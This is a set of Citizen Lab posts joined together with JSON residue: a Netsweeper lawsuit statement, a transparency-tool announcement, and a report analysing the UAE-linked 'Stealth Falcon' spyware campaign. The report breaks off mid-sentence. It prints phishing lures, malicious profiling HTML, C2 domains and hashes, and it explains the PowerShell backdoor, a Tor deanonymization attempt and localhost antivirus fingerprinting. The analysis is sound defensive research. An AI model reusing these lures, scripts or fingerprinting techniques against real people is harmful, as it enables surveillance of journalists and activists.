allows for recovery of costs, and if, “in dismissing a proceeding under this section, the judge finds that the responding party brought the proceeding in bad faith or for an improper purpose, the judge may award the moving party such damages as the judge considers appropriate.”\nIn our view, the work of Citizen Lab to carefully document practices of Internet censorship, surveillance, and targeted digital attacks is precisely the sort of activity recognized as meriting special protection under the PPPA. Had our proceedings gone forward, we intended to exercise our rights under the Act and move to dismiss Netsw­eeper’s action.\nRegardless of the status of the suit, we strenuously disagree with the claims made by Netsweeper, and stand firm in the conviction that my remarks to the media, and the report itself, are both clearly responsible communications on matters of public interest and fair comment as defined by the law.\nOne point bears underscoring: it is an indisputable fact that Citizen Lab tried to obtain and report Netsweeper’s side of the story. Indeed, we have always welcomed company engagement with us and the public at large in frank dialogue about issues of business and human rights. We sent a letter by email directly to Netsweeper on October 9, 2015. In that letter we informed Netsweeper of our findings, and presented a list of questions. We noted: “We plan to publish a report reflecting our research on October 20, 2015. We would appreciate a response to this letter from your company as soon as possible, which we commit to publish in full alongside our research report.”\nNetsweeper never replied.\nWe expect that Citizen Lab research will continue to generate strong reaction from companies and other stakeholders that are the focus of our reports. The best way we can mitigate legal and other risk is to continue to do what we are doing: careful, responsible, peer-reviewed, evidence-based research. We will continue to investigate Netsweeper and other companies implicated in Internet censorship and surveillance, and we will continue to give those companies a chance to respond to our findings, and publish their responses, alongside our reports.\nI come away from this experience profoundly appreciative of the skills of my staff and colleagues, and in particular Jakub Dalek, Sarah McKune, and Adam Senft, who assisted in the legal preparations.\nLastly, I am grateful to the University of Toronto for their support throughout this process. With corporate involvement in academia seemingly everywhere these days, it is tempting to get cynical about universities, and wonder whether corporate pressures will make university administrators lose sight of their core mission and purpose. After the experiences of the last few months, I feel optimistic about the possibilities of speaking truth to power with the protection of academic freedom that the University of Toronto has provided me.\nMeanwhile, back to work on another Citizen Lab report.\n \n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tThe Telecommunications Transparency Project is happy to announce the release of the DIY Transparency Report Tool, which is designed the help small- and medium-sized organizations produce holistic transparency reports. The Project is associated with the Citizen Lab, an interdisciplinary laboratory based at the Munk School of Global Affairs, University of Toronto, and the project was funded through the Canadian Internet Registration Authorities’s Community Investment Program.\nThe DIY Transparency Report tool helps smaller organizations produce holistic transparency reports. Such reports comprehensively explain to customers, citizens, and government agencies alike how an organization retains data, its policies for disclosing information to government agencies, and the regularity at which it does disclose information to such agencies. The tool is designed to guide organizations through the process of developing their own holistic report, while empowering them to customize their reports to reflect their organizational profile. And, critically, the tool is entirely open source and operates where the organization decides, so sensitive information is never disclosed to another party until the organization makes that decision.\nUsing this tool, organizations can create data retention guides, government requests handbooks, and government requests reports.\n\nA data retention guide can help companies rapidly identify to third-parties, including users and government agencies, whether they possess information of interest to those parties. Moreover, evaluating the data under an organization’s control can clarify whether data is being retained for a clear, and overtly stated, business purpose for an appropriate period of time. Principle 8 of Canada’s federal commercial privacy legislation, the Personal Information and Protection of Electronic Data Act (PIPEDA), asserts that “personal information that is no longer required to fulfil the identified purposes should be destroyed, erased, or made anonymous. Organizations shall develop guidelines and implement procedures to govern the destruction of personal information.” Consequently, developing a data retention guide can dovetail with an organization’s efforts to ensure it is complying with Canadian privacy law.\nA government requests handbook details how an organization responds to requests from government agencies for information which may be controlled or accessible to the organization. Such handbooks help organizations professionally respond to such requests and assist government agencies format and communicate requests in a manner that will be quickly addressed by an organization. These handbooks might explain a little about an organization, whether the organization responds to voluntary (i.e. non-court ordered) disclosure requests, how requests from foreign government agencies are handled, whether costs might be sought for providing lawful assistance, and whether the organization will seek to notify its users of any requests. Such handbooks will also clearly identify to whom, and how, government requests should be made and how the organization requires requesters to prove they are genuinely government agents.\nGovernment requests reports summarize the number, and kind, of requests that an organization has received over the period of time covered by the holistic transparency report. Such reports list different kinds of request-types, such as voluntary types of requests, court-ordered types of requests, as well as foreign requests as well as preservation requests, along with how organizations responded to such requests. Responses might include fully, partially, or refusing/being unable to provide responses, and might also note the number of affected persons/accounts which were notified of the government agencies’ request and possible subsequent disclosures.\n\nDownload DIY Transparency Report Documentation || Download DIY Transparency Report Application Code\nProject Support\n \n\nThis project was funded through the Canadian Internet Registration Authority’s Community Investment Program.

Executive Summary\nThis report describes a campaign of targeted spyware attacks carried out by a sophisticated operator, which we call Stealth Falcon.  The attacks have been conducted from 2012 until the present, against Emirati journalists, activists, and dissidents.  We discovered this campaign when an individual purporting to be from an apparently fictitious organization called “The Right to Fight” contacted Rori Donaghy.  Donaghy, a UK-based journalist and founder of the Emirates Center for Human Rights, received a spyware-laden email in November 2015, purporting to offer him a position on a human rights panel.  Donaghy has written critically of the United Arab Emirates (UAE) government in the past,1 and had recently published a series of articles based on leaked emails involving members of the UAE government.2\nCircumstantial evidence suggests a link between Stealth Falcon and the UAE government.  We traced digital artifacts used in this campaign to links sent from an activist’s Twitter account in December 2012, a period when it appears to have been under government control.  We also identified other bait content employed by this threat actor.  We found 31 public tweets sent by Stealth Falcon, 30 of which were directly targeted at one of 27 victims.  Of the 27 targets, 24 were obviously linked to the UAE, based on their profile information (e.g., photos, “UAE” in account name, location), and at least six targets appeared to be operated by people who were arrested, sought for arrest, or convicted in absentia by the UAE government, in relation to their Twitter activity.\nThe attack on Donaghy — and the Twitter attacks — involved a malicious URL shortening site.  When a user clicks on a URL shortened by Stealth Falcon operators, the site profiles the software on a user’s computer, perhaps for future exploitation, before redirecting the user to a benign website containing bait content.  We queried the URL shortener with every possible short URL, and identified 402 instances of bait content which we believe were sent by Stealth Falcon, 73% of which obviously referenced UAE issues.  Of these URLs, only the one sent to Donaghy definitively contained spyware.  However, we were able to trace the spyware Donaghy received to a network of 67 active command and control (C2) servers, suggesting broader use of the spyware, perhaps by the same or other operators.\n\nFigure 1: Tag cloud of bait content topics used by Stealth Falcon showing a strong emphasis on political topics and narratives critical of the UAE government\n \n2. Background\nRori Donaghy3 is a London-based journalist who currently works for UK news organization Middle East Eye, a website that covers news in the Middle East.4  Middle East Eye has recently published a series of articles about UAE foreign policy, based on leaked emails involving members of the UAE government.  Previously, Donaghy led the Emirates Center for Human Rights,5 an organization he founded to “promote the defence of human rights in the United Arab Emirates … through building strong relationships with the media, parliaments and other relevant organisations outside the UAE”.6\n2.1. Political and Human Rights Situation in the UAE\nIn its most recent (2015) Freedom in the World ranking, Freedom House classified the UAE as “not free,” and noted that the UAE continues to “suppress dissent”.7  Human Rights Watch stated in its most recent (2016) country report, that the UAE has “continued … to arbitrarily detain and in some cases forcibly disappear individuals who criticized the authorities”.8  Amnesty International says that UAE courts have “accepted evidence allegedly obtained through torture”.9\nSpecifically in the online realm, there is evidence that the UAE government has previously conducted malware attacks against civil society. At least three dissidents10 including a journalist, and UAE human rights activist Ahmed Mansoor, were targeted in 2012 with Hacking Team spyware11 by a Hacking Team customer in the UAE, apparently operating under the auspices of the office of Sheikh Tahnoon bin Zayed al-Nahyan,12 a son of the founder of the UAE, and now the UAE Deputy National Security Advisor.13  The UAE client had a license from Hacking Team to concurrently infect and monitor 1100 devices.14\n\nFigure 2: Diagram of Stealth Falcon’s known Targets, Fake Personas, and campaign Artefacts, along with relevant sections of the report.

The November 2015 Attack: An “Invitation”\nThis section describes an email attack against journalist Rori Donaghy. The operators used a Microsoft Word macro that installs a custom backdoor allowing operators to execute arbitrary commands on a compromised machine.\n3.1 Initial Attack Email\nIn November 2015, the journalist Donaghy received the following email message, purportedly offering him a position on a panel of human rights experts:\nFrom: the_right_to_fight@openmailbox.org\nSubject: Current Situation of Human Rights in the Middle East\nMr. Donaghy,\nWe are currently organizing a panel of experts on Human Rights in the Middle East.\nWe would like to formally invite you to apply to be a member of the panel by responding to this email.\nYou should include your thoughts and opinions in response to the following article about what more David Cameron can be doing to help aid the Middle East.\nhttp://aax.me/d0dde\nThank you.\nWe look forward to hearing back from you,\nHuman Rights: The Right to Fight\n\nDonaghy was suspicious of the email, and forwarded it to us for analysis.  We found that the link in the email (http://aax.me/d0dde) loaded a page containing a redirect to the website of Al Jazeera.  Before completing the redirect, it invoked JavaScript to profile the target’s computer.  We describe the profiling in detail in Section 3.1-3.3 below.\n3.2 Communication with the Operator\nOn our instruction, Donaghy responded to the email, asking for further information.  The operators responded with the following message:\nFrom: the_right_to_fight@openmailbox.org\nSubject: RE: Current Situation of Human Rights in the Middle East\nMr. Donaghy,\nThank you for getting back to us. We are very interested in you joining our panel.\nThe information you requested is in the attached document.\nIn order to protect the content of the attachment we had to add macro enabled security.\nPlease enable macros in order to read the provided information about our organization.\nWe hope you will consider joining us.\nThank you.\nWe look forward to hearing back from you,\nHuman Rights: The Right to Fight\n\nBy chance, the attachment was identified as malicious and blocked by a program running in Donaghy’s email account.  We instructed him to follow up and request that the operators forward the attachment via another method.  Donaghy received the following reply:\nFrom: the_right_to_fight@openmailbox.org\nSubject: RE: Current Situation of Human Rights in the Middle East\nMr. Donaghy,\nWe apologize for having problems with our attachment.\nPlease follow this link to download our organizational information.\nhttp://aax.me/a6faa\nThe link has been password protected.  The password is: right2fight\nIn order to protect the content of the attachment we also had to add macro enabled security.\nPlease enable macros in order to read the provided information about our organization.\nWe hope you will consider joining us.\nThank you.\nWe look forward to hearing back from you,\nHuman Rights: The Right to Fight\n\nThis second link (http://aax.me/a6faa) redirects to the following URL using an HTTP 302 redirect:\n\nhttps://cloud.openmailbox.org/index.php/s/ujDNWMmg8pdG3AL/authenticate\n\nThis is a password-protected link to a file shared on an ownCloud15 instance.  We obtained this file, and found it to be a Microsoft Word document.\n3.3 The Malicious Document\nThe document is:\n\nFilename:  right2fight.docm\r\nMD5:       80e8ef78b9e28015cde4205aaa65da97\r\nSHA1:      f25466e4820404c817eaf75818b7177891735886\r\nSHA256:    5a372b45285fe6f3df3ba277ee2de55d4a30fc8ef05de729cf464103632db40f\n\nWhen opened, the target is greeted with the following image, purporting to be a message from “proofpoint,” a legitimate provider of security solutions for Office 365.16  The image claims that “This Document Is Secured” and requests that the user “Please enable macros to continue.”\n\nFigure 3: Fake Proofpoint image in the malicious document sent to Donaghy\nIf the target enables macros, they are presented with the following document:\n\nFigure 4: Document that Donaghy would have seen, had he enabled macros\nThe document purports to be from an organization called “The Right To Fight,” and asks the target Donaghy to open the link in the original email he received (the email containing the profiling URL).  We believe that “The Right To Fight” is a fictitious organization, as their logo appears to be copied from an exhibition about “African American Experiences in WWII”.17  Further, “The Right to Fight” has no discernable web presence.\n\nFigure 5: Logo from exhibition about African American experiences in WWII.\n3.3.1 Profiling\nThe document attempts to execute code on the recipient’s computer, using a macro.  The macro passes a Base64-encoded command to Windows PowerShell, which gathers system information via Windows Management Instrumentation (WMI), and attempts to determine the installed version of .NET by querying the registry (full script available in Appendix A: Stage One PowerShell Command).\n3.3.2 Communication & Obtaining a Shell\nGathered information is returned to http://adhostingcache.com/ehhe/eh4g4/adcache.txt, and the server’s response is executed as a PowerShell command.  At the time, adhostingcache.com resolved to 95.215.44.37.  The domain was apparently deleted on November 30th 2015 (Donaghy received the malicious Word Document on November 24th 2015).  A new domain, adhostingcaches.com, was registered on December 3rd, which points to the same IP address.  The deletion of adhostingcache.com may reflect operator suspicion that the file received by Donaghy had been sent to security researchers.\nThe server response is a PowerShell command that decodes and materializes an invocation of a Base64-encoded PowerShell command to disk as IEWebCache.vbs, and creates a scheduled task entitled “IE Web Cache” that executes the file hourly (full script available in Appendix B: Stage Two PowerShell Command).\nIEWebCache.vbs runs a Base64-encoded PowerShell command, which periodically POSTs a unique identifier to https://incapsulawebcache.com/cache/cache.nfo (via HTTPS without verifying the server certificate, and with a hardcoded user-agent header matching Internet Explorer 10.6).  The script executes server responses as PowerShell commands, responding back to the server with the exit status of, output of, or any exceptions generated by the commands.  \nThis gives the operator control over the victim’s computer, and allows the operator to install additional spyware or perform other activities.  All commands and responses are encrypted using RC4 with a hardcoded key, and the encrypted message is prefixed with a hardcoded value.\nDespite some similarities in functionality to the Empire backdoor,18 we were unable to identify any shared code, and we suspect that the backdoor is custom-made.\n3.4. Technical Analysis: aax.me Browser Profiling\nWhile aax.me has a public interface where anyone may shorten a link, aax.me only conducts browser profiling of individuals who click on links that are specially shortened by Stealth Falcon operators.\nIn November 2015, when we accessed the link in the second email that Donaghy received, http://aax.me/a6faa, we found that it redirected directly to https://cloud.openmailbox.org/index.php/s/ujDNWMmg8pdG3AL/authenticate via an HTTP 302 redirect.  When we accessed the link in the first email that Donaghy received, http://aax.me/d0dde, the server responded with the following page:\n\n<iframe src='redirect.php' height='1' width='1' border='0' scrolling='no' frameborder='0' unselectable='yes' marginheight='0' marginwidth='0' onload='setTimeout(\"document.location =\\\"http://www.aljazeera.com/indepth/opinion/2015/11/british-pm-middle-east-human-rights-151103070038237.html\\\"\", 20000)'></iframe><br><br><br><center><img src='loading.gif'><br>Loading the website:<br><b>http://www.aljazeera.com/indepth/opinion/2015/11/british-pm-middle-east-human-rights-151103070038237.html</b>.<br>This may take a few seconds.</center>\n\nThe page is apparently designed to redirect to an Al Jazeera op-ed after twenty seconds.19  However, the URL is incorrect: the last character of the filename should be a “1” instead of a “7”.  Therefore, an Al Jazeera 404 page is returned instead of the op-ed.  It is possible that the use of “7” instead of “1” represents a transcription error on the part of the operators.  When we accessed this same aax.me URL in March 2016, it redirected directly to the Al Jazeera URL (with typo) via an HTTP 302 redirect.\nThe iframe, http://aax.me/redirect.php, reloads itself with a parameter “inFr” in its query string, to indicate whether the page has been opened up inside a frame.\n\n<html><body><script type=\"text/javascript\">if(window!=window.top){inFr=\"1\"}else{inFr=\"0\"}document.location=document.location+\"?inFr=\"+inFr;</script><noscript><img src=\"?jSc=0\"/></noscript></body></html>\n\nIf the page has not been opened up inside a frame (inFr=0), then a blank page is returned.  If the page is opened inside a frame (inFr=1), as is the case here, then the following page is returned (we ommitted the PHPSESSID value):\n\n<html><head></head><body><div id='display' height='1' style='display:none;'></div><form id='statsPost' action='?stats=1' method='POST'><input type=\"hidden\" name=\"PHPSESSID\" value=\"\" /><input id='theData' name='theData' type='hidden' value='' /></form><script type='text/javascript' src='redirect.js'></script></body></html>\n\nWe examined the referenced JavaScript file, http://aax.me/redirect.js.  The file is designed to profile a user’s system, perhaps to gather intelligence about potentially exploitable vulnerabilities.  The file has apparently not been updated since 7 May 2013,20 rendering some of the probing obsolete.  We enclose the file’s full contents in Appendix C: JavaScript Profiling File.  The profiling performs the following actions:\n\nFor Internet Explorer, it attempts to create several instances of ActiveXObject to get the versions of Flash, Shockwave, Java, RealPlayer, Windows Media Player, and Microsoft Office (classified as either 2003, 2007, or 2010).\n\nFor non-Internet Explorer browsers, it attempts to get a list of enabled plugins from navigator.mimeTypes.\n\nFor all browsers, it captures the user agent, whether cookies are enabled, the OS, the size of the browser window, and the timezone.  It classifies browsers into different versions, denoted by letters, based on the existence and behavior of certain JavaScript methods.\n\nThe script attempts to exploit an information leak in older versions of Tor Browser.  We explore the technique used in Section 3.5.\n\nFor Windows browsers (except Opera, and versions of Internet Explorer before IE9), it sends a series of XMLHttpRequests to 127.0.0.1, which we believe are designed to deduce if the computer is running any one of several specific antivirus programs.  The code for this appears to be borrowed from the JS-Recon port scanning tool.21  The creator of JS-Recon presented the tool at BlackHat Abu Dhabi in 2010.22  We explore such techniques in more detail in Section 3.6.\n\nWe were unfamiliar with the website aax.me, so we investigated it further.  We found that the main page of aax.me purported to be a public URL shortening service, powered by YOURLS,23 an open source PHP framework allowing anyone to set up their own URL shortening service.  We are unable to ascertain whether the site actually uses any YOURLS code.  We also noted that the homepage contains a typo (“Shortend [sic] URL”).\n\nFigure 6: Homepage of aax.me\nWe shortened a URL using the homepage, but found that clicking on the shortened URL did not trigger the loading of the intermediate page, http://aax.me/redirect.php.  We also did not find the code for redirect.php or redirect.js in the public code repository for YOURLS.24  Thus, we deduced that this code was likely specially written by the operators, and the link sent to Donaghy was likely created by someone with administrator access to aax.me.\n3.5. Technical Analysis: aax.me Tor Deanonymization Attempt\nThe aax.me site appears to attempt to deanonymize users of Tor Browser.  While the technique the operators used was out-of-date at the time we observed the attack, the attempted Tor deanonymization speaks to their motivations and potential targets.\nThe script first detects Tor Browsers by checking whether navigator.buildID is set to zero (all testing was conducted on English, Windows builds of Tor Browser).  Versions of Tor Browser  before 2.3.25-12 (released on 13 August 2013) had their buildID set to zero.  This behavior was originally introduced in TorButton,25 in support of the goal of making Tor users appear homogenous.26  Current Tor Browser versions have navigator.buildID set to a different distinctive value, 20000101000000.\nWhen the script detects a Tor Browser, it attempts to deduce the version of Tor Browser by checking for the existence and behavior of certain JavaScript methods.  Once a browser is determined to be older than a certain version of Tor Browser, the script exploits a now-fixed bug to get the disk path of the browser installation.27  The disk path may contain the target’s username, which may include the target’s real name.\nThe bug in Tor Browser was first disclosed at Defcon 17, which took place in August 2009.28  The bug was first fixed on on 25 May 2012 in Tor Browser release 2.2.35-13.29  The bug was, however, later reintroduced into Tor Browser on 18 December 2013 with the release of Tor Browser 3.5, and subsequently fixed again in Tor Browser 3.6 on 29 April 2014.30  However, unfortunately for the operators, they failed to update their profiling script to reflect Tor Browser’s navigator.buildID change (before the bug was reintroduced).  Thus, the profiling script did not detect Tor Browsers with the reintroduced bug as Tor Browsers, so it did not try to exploit them.  Even if it had been updated to reflect the navigator.buildID change, the version check in the Tor Browser exploitation code would also have to be updated to select the versions with the reintroduced bug for exploitation.\nThe version of Tor Browser (as determined by JavaScript checks) is submitted back to the server, along with the value of navigator.oscpu (which reveals the version of the OS on which Tor Browser is running — e.g., the latest version of Tor Browser on OSX El Capitan reveals: “Intel Mac OS X 10.11”) which is set to “Windows NT 6.1” in the latest Tor browser, navigator.vendor (which appears blank in the latest Tor Browser), and any data gathered about the installation path.\n3.6. Technical Analysis: aax.me Antivirus Profiling\nInterestingly, aax.me also attempts to determine the presence of various antivirus products on a target’s machine.\nWe expand on the probing of antivirus programs which we observed on aax.me, as we were unfamiliar with this technique.  The technique appears to work on any modern version of Windows, with the latest versions of Chrome, Firefox, and IE/Edge (though, the profiling script excludes IE versions less than IE9 from the profiling, using the vertical tab test).31  Specifically, the script conducts GET XMLHttpRequests (one at a time) to 127.0.0.1/ on the following ports: 12993, 44080, 24961, 1110, 6646, 6999, 30606.  The script stops conducting these requests if it finds one request whose readyState is set to 4 less than 20ms after the request was initiated (200ms for port 6646), and submits the number of this port to the server.\nThe latest versions of Internet Explorer/Edge, Chrome, and Firefox (except Tor Browser) will all perform these XMLHttpRequests to 127.0.0.1 on behalf of any site.  Of course, the result of such a request will most likely not be available to the script, due to the same-origin policy, and likely absence of a CORS32 header in the response.  Indeed, the script does not attempt to read the results of its requests.  Rather, it leverages the fact that the web browser makes the status of the request sent available, via the readyState parameter of an XMLHttpRequest instance (1 approximately represents TCP SYN sent, and 4 represents HTTP response received or TCP connection terminated).  For a closed port, Windows will issue an RST/ACK for each SYN sent.  However, it appears that Windows’ TCP stack will not consider an outgoing connection it is initiating to be terminated until it has sent 3 SYNs, and received three corresponding RST/ACKs (or timeouts).\n\nFigure 7: Three RST/ACKs required until Windows considers outgoing TCP connection terminated\nWhen testing with a TCP connection from Windows to a remote host, we can clearly see that Windows transmits the second SYN ~500ms after the first RST/ACK, and the third SYN ~500ms after the second RST/ACK.\n\nFigure 8: Windows sends the next SYN 500ms after the latest RST/ACK\nThus, the readyState value for a request to a closed port on 127.0.0.1 will not be set equal to 4 until approximately 1000ms after the request is issued.  In summary, one can use this technique to distinguish between a closed port (readyState set to 4 at around 1000ms), an open port (readyState set to 4 before 1000ms), and a filtered port (readyState set to 4 long after 1000ms).\nThis script was apparently designed to detect the presence of certain components of Avast, Avira, ESET, Kaspersky, and Trend Micro antivirus products.  We were not able to determine which program the probing of port 24961 was designed to detect.  We verified that the latest version of Avast can be detected by this script, as it opens TCP port 12993, which is associated with its Mail Shield component for scanning email traffic; port 6999 is opened by Trend Micro’s tmproxy33 which scans web and email traffic; port 1110 is used by Kaspersky34 to scan web and email traffic; it appears that Avira’s Web Protection component for scanning web traffic used to open port 44080,35 though we observed it opening 44081 instead; port 30606 appears to have been used by ESET to scan web and email traffic,36 but we did not observe this port open while testing the latest version of ESET; port 6646 may be used by McAfee, though we did not test this.37\nThe code for the port scanning appears to be adapted from the JS-Recon port scanning tool.38  JS-Recon is a generic tool that enumerates all open ports on 127.0.0.1 in a range; it does not specifically target anti-virus programs.  The scan_xhr and check_ps_xhr functions in the aax.me profiling script are similar to the scan_ports_xhr and check_ps_xhr functions in JS-Recon.  The creator of JS-Recon seems to have first presented the tool at BlackHat Abu Dhabi in 2010.39\n\nFigure 9: Image from the author of JS-Recon showing how long WebSocket and XMLHttpRequest (“COR”) connections remain in their initial readyState on Windows.40\nNote that this technique can be generalized to any remote content timing side channel (e.g, the onerror event for an Image).  Additionally, one can identify the presence of an open port on 127.0.0.1 that speaks HTTP without using timing information, and thus without the Windows TCP behavior assumption (e.g., by handling the onerror and oncomplete events of certain types of link elements). \nWe are unsure whether the purpose of the antivirus profiling is to identify potentially exploitable antivirus software running on a target’s computer, or for evasion of antivirus products.  In December 2015, Google Security discovered a critical vulnerability in Avast’s antivirus product, which involved a webpage sending HTTP requests to a port that Avast opens on 127.0.0.1.  Google Security demonstrated that the vulnerability allowed exfiltration of arbitrary files from a victim’s disk.41  In January 2016, Google Security discovered a critical vulnerability in Trend Micro’s antivirus product, which similarly involved a web page sending HTTP requests to a port that Trend Micro opens on 127.0.0.1.  Google Security demonstrated that the vulnerability allowed arbitrary command execution.\n \n4. The Case of the Fake Journalist\nIn the course of our investigation we scanned the e-mail of journalist Donaghy and found evidence that he had been contacted by a fictitious journalist, whom we linked to Stealth Falcon.\nWe scanned Donaghy’s GMail account for any previous messages featuring links that redirected through aax.me.  We identified the following message from December 2013, purporting to be from a UK journalist named Andrew Dwight:\nFrom: andrew.dwight389@outlook.com\nSubject: FW: Correspondence Request\nGreetings Mr. Donaghy,\nI have been trying to reach you for comment and I am hoping that this e-mail reaches the intended recipient. My name is Andrew Dwight and I am currently writing a book about my experiences in the Middle East. My focus is on human factors and rights issues in seemingly non-authoritarian regimes (that are, in reality, anything but). I was hoping that I might correspond with you and reference some of your work, specifically this piece (http://goo.gl/60HAqJ), for the book. I’m quite impressed with the way you articulate this complex issue for the masses, and hope to have a similar impact with my book.\nHappy New Year,\nAndrew\n\n\nThe link in the email, http://goo.gl/60HAqJ, redirects to http://aax.me/0b152, which, as of December 2015, redirected to a 2013 Huffington Post blog post authored by Donaghy.42  We did not observe any redirect.php behavior with this link; as of December 2015, the aax.me link directly served an HTTP 302 redirect to the Huffington Post (we omitted the date header below).  However, it is possible that the link formerly exhibited redirect.php behavior:\n\n\r\nHTTP/1.1 302 Moved Temporarily\r\nDate:\r\nServer: Apache/2.2.9 (Debian) mod_ssl/2.2.9 OpenSSL/0.9.8g\r\nX-Powered-By: PHP/5.2.6-1+lenny13\r\nLocation: http://www.huffingtonpost.co.uk/rori-donaghy/uae-94_b_3549671.html\r\nVary: Accept-Encoding\r\nContent-Type: text/html\n\nWe found that Donaghy had responded to this message shortly after receiving it, offering to meet in-person with Andrew in the UK.  Andrew responded several weeks later with the following:\n\nFrom: andrew.dwight389@outlook.com\nSubject: RE: Correspondence Request\nHello Rori,\nHappy New Year! I apologize for the delay in getting back to you. I was on a ski holiday in upstate New York for the New Year and just returned to my current accommodations in the city. I was due back sooner, but as you may know, the weather has not been agreeable here in the Eastern United States!\nI am currently situated in the US. while I complete my book to be closer to my publisher and editor. The book focuses on the various guises used by Middle Eastern countries to demonstrate that they are providing equal and fair treatment with concern to human rights. I am working with several organizations in identifying cases that reveal their true lack of concern for liberty and personal freedoms. I’m using these cases as testimony about this under reported issue. Have you heard of a Swedish organization named Al Karama?\nThere website: http://en.alkarama.org/index.php?option=com_content&view=article&id=1005&Itemid=74&slid=102\nI have spoken to one of their junior editors and I am hoping to obtain input from some of their sources as well.\nThis issue never gets any smaller does it? I hope that a few loud voices (and a well received book) can make a difference.\nCheers,\nAndrew\n\nWhile attempting to determine whether “Andrew Dwight” was a real person, we we found a Twitter profile, @Dwight389 for the same persona, and that mentions the same address from which Donaghy received the email.\n\nFigure 10: Andrew Dwight’s Twitter profile, @Dwight389, mentioning the email address that corresponded with Donaghy in 2013, andrew.dwight389@outlook.com\nWe found that this account messaged three UAE dissident accounts via Twitter mentions.  While we were unable to establish if @Dwight389 successfully attacked any of these individuals, we profile the targets below.\n4.1. Another Target: Obaid Yousef Al-Zaabi\nThis section describes how the fake journalist persona contacted Obaid Yousef Al-Zaabi, a blogger who was arrested for criticising the UAE.\n\nFigure 11: @Dwight389 contacted @bukhaledobaid on 24 April 2013\nObaid Yousef Al-Zaabi was arrested on 2 July 201343 for Tweeting about the UAE94 detainees (94 defendants prosecuted in a mass trial on charges of attempting to overthrow the government)44 on his @bukhaledobaid account, which displays his real name.45  He was released due to health problems a month later, but was arrested again on 12 December 2013,46 a day after talking to CNN47 about the condition of US citizen Shezanne Cassim, imprisoned for making a parody video48 about “youth culture in Dubai”.49  Al-Zaabi and Cassim were imprisoned in the same cellblock.  Al-Zaabi was acquitted on 23 June 2014 of all charges including “slander concerning the rulers of the UAE using phrases that lower their status, and accusing them of oppression” and “disseminating ideas and news meant to mock and damage the reputation of a governmental institution,” but, according to information received from two UAE sources, Al-Zaabi is still imprisoned in the prisoners ward of a hospital.  A coalition of 13 human rights organizations including Amnesty International consider Al-Zaabi’s ongoing detention to be arbitrary, and without legal basis.50  Amnesty International reported that “a senior State Security Prosecution official” told Al-Zaabi he would continue to be detained even if acquitted.51\nAl-Zaabi’s brother, Dr. Ahmed Al-Zaabi, is one of the UAE94 detainees and is currently serving a 10 year prison sentence.  According to a report by the Gulf Center for Human Rights, Ahmed was tortured in prison: his fingernails were pulled out, and he was “beaten to the point he was left swollen, covered in bruises all over his body and with large amounts of blood in his urine”.52\n4.2. Another Target:Professor Abdullah Al-Shamsi\nThis section describes how the fake journalist persona contacted professor Abdullah Al-Shamsi, Vice Chancellor of the British University in Dubai. \n\nFigure 12: @Dwight389 sent a message on 9 May 2013 suggesting he had targeted @shamsiuae58\nProfessor Abdullah Al-Shamsi (@shamsiuae58) is the Vice Chancellor of the British University in Dubai.53  He (Arabic name: أ.د.عبدالله محمد رحمة الشامسي)54 is signatory #79 (out of 133) to a March 2011 petition to the UAE government55 for direct elections56 (UAE activist Ahmed Mansoor was arrested after signing the same petition).57  Al-Shamsi’s father (محمد بن رحمة العامري الشامسي) was appointed to, and chaired the first sessions of, the Federal National Council (FNC), a legislative advisory council that is now an elected body.  He called for more powers to be given to the FNC.58\n4.3. Additional Targets: Qatari Citizens Sentenced to Prison\n\nFigure 13: @Dwight389 contacted @northsniper on 7 November 2013\nIn May 2015, five Qataris were sentenced (one present in the UAE to 10 years in prison, and four in absentia to life in prison), for posting allegedly offensive pictures of the UAE Royal Family on three Twitter accounts and two Instagram accounts,59 including @northsniper.60  At trial, the prosecution accused the five of being agents of Qatar’s State Security, and posting the allegedly offensive pictures as part of a “military mission” to “show that Emiratis had offended their own leaders”.61  The @northsniper account is currently suspended.  One Instagram account allegedly used by defendants in this case (@9ip) is still active, and still appears to display unflattering photoshopped images of the President, Crown Prince, and Founder of the UAE.62\n \n5. Stealth Falcon’s Widespread Targeting of UAE Figures\nThis section describes how we identified additional Stealth Falcon victims and bait content, and traced Stealth Falcon’s spyware to additional C2 servers.\nGiven Stealh Falcon’s use of public Twitter mentions to contact individuals, we searched Google and Twitter for instances of aax.me links.  The links we found indicated that we could easily probe aax.me to get a comprehensive list of all currently active short URLs, and their corresponding long URLs.  Our findings point to a UAE-focused operator, whose bait content and targets are linked to the Emirates.  Furthermore, we were able to connect this attack to case from December 2012, where an anonymous UAE activist contacted us and claimed to have received a suspicious link from a Twitter account that was purportedly under government control.\n5.1. Public Targets and Links to Arrests\nThis section describes 24 Stealth Falcon Twitter targets we identified on the basis of them receiving an aax.me link in a Twitter mention.\nWe found aax.me links targeting 24 accounts, each of whom was mentioned in a tweet that also contained an aax.me shortened link.  We were unable to get details about 17 of the accounts.  Of the accounts we have been able to identify, several individuals were subsequently arrested or convicted in absentia by the UAE Government in relation to their online activities.\nThe following table outlines these cases, and notes arrests.  For completeness, the table includes the cases from Section 4.1-4.3:\n\n\n\nHandle\nTargeting\nRelated Arrests / Convictions\nNote\n\n\n@omran83\n14 January 201263\n16 July 201264\n(arrested)\nUAE94 prisoner; serving 7 years in prison.65\n\n\n@weldbudhabi\n5 August 2012;66\n20 October 201267\n14 December 201268\n(arrested)\n\n\n\n@intihakat\n5 August 201269\n25 December 201370\n(convicted)\nQatari convicted in absentia; sentenced to 5 years in prison.\n\n\n@bukhaledobaid\n(Sec 4.1)\n24 April 201371\n2 July 2013;72\n12 December 201373\n(arrested)\nBrother of UAE94 prisoner; acquitted of charges; indefinitely detained in prisoners ward of hospital.\n\n\n@northsniper\n(Sec 4.3)\n7 November 201374\n18 May 201575\n(convicted)\nFive Qataris convicted; sentences ranged from 10 years to life in prison.\n\n\n@71UAE \n9 January 201276\n\nLast tweeted 1 July 2013, a day before arrest of @bukhaledobaid.\n\n\n@kh_oz \n10 January 201277\n\nLikely son of @bukhaledobaid.78\n\n\n@shamsiuae58\n(Sec 4.2)\n9 May 201379\n\nSigned 2011 pro-democracy petition that Ahmed Mansoor was arrested after signing.\n\n\n@newbedon\n9 January 201280\n\nDonaghy describes the account as “ensur[ing that] details of mistreatment [by security forces] are readily available”.81\n\n\n@bomsabih\n9 January 201282\n\nInactive since 8 October 2014.  Owner claimed affiliation with State Security Apparatus.\n\n\n\nWe list additional details in Appendix D: Public Stealth Falcon Tweets.\n5.2. Ennumerating aax.me for Bait Content\nThis section describes how we probed every conceivable short URL on aax.me, and found 402 pieces of bait content that we believe were sent by Stealth Falcon.\nAll of the public aax.me links we found, as well as the links sent to Donaghy, matched the regular expression 